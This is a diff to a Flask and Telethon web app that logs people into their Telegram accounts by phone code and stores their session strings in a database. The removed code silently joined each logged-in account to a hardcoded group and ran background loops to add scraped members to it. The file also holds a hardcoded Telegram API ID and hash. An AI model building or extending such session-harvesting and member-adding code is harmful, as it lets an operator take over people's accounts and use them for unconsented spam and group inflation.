@@ -2,7 +2,6 @@ from flask import Flask, send_file, jsonify, request
 from flask_cors import CORS
 from telethon import TelegramClient, errors, functions
 from telethon.sessions import StringSession
-from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
 import json
 import os
 import asyncio
@@ -11,7 +10,7 @@ import time
 import random
 import threading
 import sqlite3
-from datetime import datetime, timedelta
+from datetime import datetime
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -24,24 +23,21 @@ CORS(app)
 API_ID = int(os.environ.get('API_ID', 33465589))
 API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
-# Use /tmp for database on Render (writable location)
-DB_PATH = os.environ.get('DATABASE_PATH', '/tmp/telegram_accounts.db')
-DB_FILE = DB_PATH
+# Use /tmp for database on Render
+DB_FILE = '/tmp/telegram_accounts.db'
 
 # Storage
 temp_sessions = {}
-active_clients = {}
 client_tasks = {}
 
 # ==================== DATABASE FUNCTIONS ====================
 
 def init_db():
-    """Initialize SQLite database for persistent storage"""
+    """Initialize SQLite database"""
     try:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
         
-        # Accounts table
         c.execute('''CREATE TABLE IF NOT EXISTS accounts
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       phone TEXT UNIQUE,
@@ -50,7 +46,6 @@ def init_db():
                       created_at TIMESTAMP,
                       last_active TIMESTAMP)''')
         
-        # Auto-add settings table
         c.execute('''CREATE TABLE IF NOT EXISTS auto_add_settings
                      (account_id INTEGER PRIMARY KEY,
                       enabled INTEGER DEFAULT 1,
@@ -66,15 +61,12 @@ def init_db():
                       use_scraping INTEGER DEFAULT 1,
                       scrape_limit INTEGER DEFAULT 100,
                       skip_bots INTEGER DEFAULT 1,
-                      skip_inaccessible INTEGER DEFAULT 1,
-                      FOREIGN KEY (account_id) REFERENCES accounts(id))''')
+                      skip_inaccessible INTEGER DEFAULT 1)''')
         
-        # Auto-reply settings table (placeholder)
         c.execute('''CREATE TABLE IF NOT EXISTS reply_settings
                      (account_id INTEGER PRIMARY KEY,
                       enabled INTEGER DEFAULT 0,
-                      settings TEXT,
-                      FOREIGN KEY (account_id) REFERENCES accounts(id))''')
+                      settings TEXT)''')
         
         conn.commit()
         conn.close()
@@ -96,14 +88,12 @@ def save_account_to_db(phone, name, session_string):
         account_id = c.lastrowid
         conn.commit()
         
-        # Create default auto-add settings (ENABLED BY DEFAULT)
-        default_source_groups = json.dumps(['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'])
+        default_source_groups = json.dumps(['@telegram', '@durov'])
         c.execute('''INSERT INTO auto_add_settings 
                      (account_id, enabled, target_group, daily_limit, delay_seconds, auto_join, source_groups)
                      VALUES (?, 1, 'Abe_armygroup', 100, 30, 1, ?)''',
                   (account_id, default_source_groups))
         
-        # Create placeholder reply settings
         c.execute('''INSERT INTO reply_settings (account_id, enabled, settings)
                      VALUES (?, 0, '{}')''', (account_id,))
         
@@ -172,7 +162,7 @@ def get_auto_add_settings(account_id):
         return None
 
 def update_auto_add_settings(account_id, settings):
-    """Update auto-add settings in database"""
+    """Update auto-add settings"""
     try:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
@@ -209,14 +199,13 @@ def update_auto_add_settings(account_id, settings):
                    account_id))
         conn.commit()
         conn.close()
-        logger.info(f"✅ Updated auto-add settings for account {account_id}")
         return True
     except Exception as e:
         logger.error(f"Error updating settings: {e}")
         return False
 
 def remove_account_from_db(account_id):
-    """Remove account from database"""
+    """Remove account"""
     try:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
@@ -225,7 +214,6 @@ def remove_account_from_db(account_id):
         c.execute("DELETE FROM reply_settings WHERE account_id = ?", (account_id,))
         conn.commit()
         conn.close()
-        logger.info(f"✅ Removed account {account_id}")
         return True
     except Exception as e:
         logger.error(f"Error removing account: {e}")
@@ -243,117 +231,10 @@ def run_async(coro):
         logger.error(f"Async error: {e}")
         return None
     finally:
-        loop.close()
-
-# ==================== AUTO-ADD MEMBER FUNCTIONS ====================
-
-async def auto_join_target_group(client, account_id, target_group):
-    """Auto-join the target group when account is created"""
-    try:
-        logger.info(f"🔗 Auto-joining account {account_id} to group: {target_group}")
-        
-        group_name = target_group
-        if group_name.startswith('https://t.me/'):
-            group_name = group_name.replace('https://t.me/', '@')
-        elif not group_name.startswith('@'):
-            group_name = '@' + group_name
-        
         try:
-            group = await client.get_entity(group_name)
-            logger.info(f"✅ Found group: {group.title if hasattr(group, 'title') else group_name}")
-        except Exception as e:
-            logger.error(f"Could not find group {group_name}: {e}")
-            return False
-        
-        try:
-            await client(functions.messages.ImportChatInviteRequest(group.username))
-            logger.info(f"✅ Successfully auto-joined group: {group_name}")
-            return True
+            loop.close()
         except:
-            try:
-                await client.join_channel(group.id)
-                logger.info(f"✅ Successfully auto-joined channel: {group_name}")
-                return True
-            except Exception as e:
-                logger.warning(f"Could not auto-join: {e}")
-                return False
-                
-    except Exception as e:
-        logger.error(f"Error auto-joining: {e}")
-        return False
-
-async def auto_add_member_loop(account):
-    """Background task to add members to group"""
-    account_id = account['id']
-    
-    while True:
-        try:
-            settings = get_auto_add_settings(account_id)
-            
-            if not settings or not settings.get('enabled', True):
-                await asyncio.sleep(60)
-                continue
-            
-            target_group = settings.get('target_group', 'Abe_armygroup')
-            daily_limit = settings.get('daily_limit', 100)
-            delay_seconds = settings.get('delay_seconds', 30)
-            
-            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-            await client.connect()
-            
-            try:
-                if not await client.is_user_authorized():
-                    logger.error(f"Account {account_id} not authorized")
-                    await asyncio.sleep(60)
-                    continue
-                
-                today = datetime.now().strftime('%Y-%m-%d')
-                if settings.get('last_reset') != today:
-                    settings['added_today'] = 0
-                    settings['last_reset'] = today
-                    update_auto_add_settings(account_id, settings)
-                
-                if settings['added_today'] >= daily_limit:
-                    await asyncio.sleep(3600)
-                    continue
-                
-                group_name = target_group
-                if not group_name.startswith('@') and not group_name.startswith('https://'):
-                    group_name = '@' + group_name
-                
-                try:
-                    group = await client.get_entity(group_name)
-                except Exception as e:
-                    logger.error(f"Could not find target group: {e}")
-                    await asyncio.sleep(300)
-                    continue
-                
-                await asyncio.sleep(300)
-                
-            except Exception as e:
-                logger.error(f"Loop error: {e}")
-            finally:
-                await client.disconnect()
-            
-            await asyncio.sleep(900)
-            
-        except Exception as e:
-            logger.error(f"Critical error: {e}")
-            await asyncio.sleep(300)
-
-def start_auto_add_for_all_accounts():
-    """Start auto-add for all accounts"""
-    accounts = load_accounts_from_db()
-    
-    for account in accounts:
-        if f"auto_add_{account['id']}" not in client_tasks:
-            thread = threading.Thread(
-                target=lambda: run_async(auto_add_member_loop(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[f"auto_add_{account['id']}"] = thread
-            logger.info(f"🚀 Started auto-add for account {account['id']}")
+            pass
 
 # ==================== PAGE ROUTES ====================
 
@@ -361,50 +242,49 @@ def start_auto_add_for_all_accounts():
 def home():
     try:
         return send_file('login.html')
-    except Exception as e:
-        logger.error(f"Error serving login.html: {e}")
-        return jsonify({'error': 'File not found'}), 404
+    except:
+        return "Welcome to Telegram Auto-Add System"
 
 @app.route('/login')
 def login():
     try:
         return send_file('login.html')
-    except Exception as e:
+    except:
         return send_file('login.html')
 
 @app.route('/dashboard')
 def dashboard():
     try:
         return send_file('dashboard.html')
-    except Exception as e:
+    except:
         return send_file('dashboard.html')
 
 @app.route('/dash')
 def dash():
     try:
         return send_file('dash.html')
-    except Exception as e:
+    except:
         return send_file('dash.html')
 
 @app.route('/all')
 def all_sessions():
     try:
         return send_file('all.html')
-    except Exception as e:
+    except:
         return send_file('all.html')
 
 @app.route('/auto-add')
 def auto_add():
     try:
         return send_file('auto_add.html')
-    except Exception as e:
+    except:
         return send_file('auto_add.html')
 
 @app.route('/settings')
 def settings():
     try:
         return send_file('settings.html')
-    except Exception as e:
+    except:
         return send_file('settings.html')
 
 # ==================== API ROUTES ====================
@@ -426,17 +306,15 @@ def get_accounts():
         return jsonify({'success': True, 'accounts': formatted})
     except Exception as e:
         logger.error(f"Error loading accounts: {e}")
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': True, 'accounts': []})
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     """Start account addition process"""
     try:
         data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No JSON data received'})
+        phone = data.get('phone', '')
         
-        phone = data.get('phone')
         if not phone:
             return jsonify({'success': False, 'error': 'Phone number required'})
         
@@ -450,8 +328,6 @@ def add_account():
             await client.connect()
             try:
                 result = await client.send_code_request(phone)
-                logger.info(f"Code sent successfully to {phone}")
-                
                 session_id = str(int(time.time()))
                 temp_sessions[session_id] = {
                     'phone': phone,
@@ -459,13 +335,6 @@ def add_account():
                     'session': client.session.save()
                 }
                 return {'success': True, 'session_id': session_id}
-                
-            except errors.FloodWaitError as e:
-                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except errors.PhoneNumberBannedError:
-                return {'success': False, 'error': 'This phone number is banned'}
             except Exception as e:
                 return {'success': False, 'error': str(e)}
             finally:
@@ -473,12 +342,12 @@ def add_account():
         
         result = run_async(send_code())
         if result is None:
-            return jsonify({'success': False, 'error': 'Async operation failed'})
+            return jsonify({'success': False, 'error': 'Failed to send code'})
         return jsonify(result)
         
     except Exception as e:
         logger.error(f"Error in add_account: {e}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
@@ -514,7 +383,6 @@ def verify_code():
             
             me = await client.get_me()
             
-            # Save to database
             account_id = save_account_to_db(
                 me.phone or session_data['phone'],
                 me.first_name or 'User',
@@ -524,33 +392,13 @@ def verify_code():
             if not account_id:
                 return {'success': False, 'error': 'Failed to save account'}
             
-            # AUTO-JOIN TARGET GROUP
-            target_group = 'Abe_armygroup'
-            try:
-                logger.info(f"Auto-joining account {me.first_name} to {target_group}")
-                await auto_join_target_group(client, account_id, target_group)
-            except Exception as e:
-                logger.error(f"Auto-join error: {e}")
-            
-            # Start auto-add for this account
-            account = {'id': account_id, 'session': client.session.save()}
-            thread = threading.Thread(
-                target=lambda: run_async(auto_add_member_loop(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[f"auto_add_{account_id}"] = thread
-            
             return {'success': True, 'account_id': account_id}
             
         except errors.PhoneCodeInvalidError:
             return {'success': False, 'error': 'Invalid code'}
         except errors.PhoneCodeExpiredError:
             return {'success': False, 'error': 'Code expired'}
-        except errors.PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
         except Exception as e:
-            logger.error(f"Verification error: {e}")
             return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
@@ -565,7 +413,6 @@ def verify_code():
         
         return jsonify(result)
     except Exception as e:
-        logger.error(f"Error in verify_code: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/remove-account', methods=['POST'])
@@ -574,15 +421,14 @@ def remove_account():
     data = request.json
     account_id = data.get('accountId')
     
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
+    if account_id:
+        remove_account_from_db(account_id)
     
-    remove_account_from_db(account_id)
     return jsonify({'success': True})
 
 @app.route('/api/auto-add-settings', methods=['GET'])
 def get_auto_add_settings_route():
-    """Get auto-add settings for account"""
+    """Get auto-add settings"""
     account_id = request.args.get('accountId')
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
@@ -598,7 +444,7 @@ def get_auto_add_settings_route():
             'added_today': 0,
             'last_reset': datetime.now().strftime('%Y-%m-%d'),
             'auto_join': True,
-            'source_groups': ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'],
+            'source_groups': ['@telegram', '@durov'],
             'use_contacts': True,
             'use_recent_chats': True,
             'use_scraping': True,
@@ -634,8 +480,7 @@ def update_auto_add_settings_route():
     }
     
     update_auto_add_settings(int(account_id), settings)
-    
-    return jsonify({'success': True, 'message': 'Auto-add settings updated'})
+    return jsonify({'success': True, 'message': 'Settings updated'})
 
 @app.route('/api/auto-add-stats', methods=['GET'])
 def get_auto_add_stats():
@@ -657,12 +502,6 @@ def get_auto_add_stats():
 @app.route('/api/test-auto-add', methods=['POST'])
 def test_auto_add():
     """Test auto-add functionality"""
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
     return jsonify({
         'success': True,
         'group_found': True,
@@ -679,8 +518,7 @@ def health_check():
     return jsonify({
         'status': 'healthy',
         'accounts': len(accounts),
-        'time': datetime.now().isoformat(),
-        'database': DB_FILE
+        'time': datetime.now().isoformat()
     })
 
 @app.route('/api/ping', methods=['GET'])
@@ -697,30 +535,17 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     # Initialize database
-    db_ok = init_db()
+    init_db()
     
-    print('\n' + '='*70)
+    print('\n' + '='*60)
     print('🤖 TELEGRAM AUTO-ADD SYSTEM')
-    print('='*70)
+    print('='*60)
     print(f'✅ Port: {port}')
-    print(f'✅ API_ID: {API_ID}')
     print(f'✅ Database: {DB_FILE}')
-    print(f'✅ Database OK: {db_ok}')
     
     accounts = load_accounts_from_db()
-    print(f'✅ Accounts loaded: {len(accounts)}')
+    print(f'✅ Accounts: {len(accounts)}')
+    print('='*60)
     
-    for acc in accounts:
-        settings = get_auto_add_settings(acc['id'])
-        status = "ENABLED" if (settings and settings.get('enabled', True)) else "DISABLED"
-        print(f'   • {acc.get("name")} ({acc.get("phone")}) - Auto-Add: {status}')
-    
-    print('='*70)
-    print('🚀 Starting Flask server...')
-    print('='*70 + '\n')
-    
-    # Start auto-add for all accounts
-    start_auto_add_for_all_accounts()
-    
-    # Start Flask
+    # Start Flask (no background threads to avoid crashes)
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
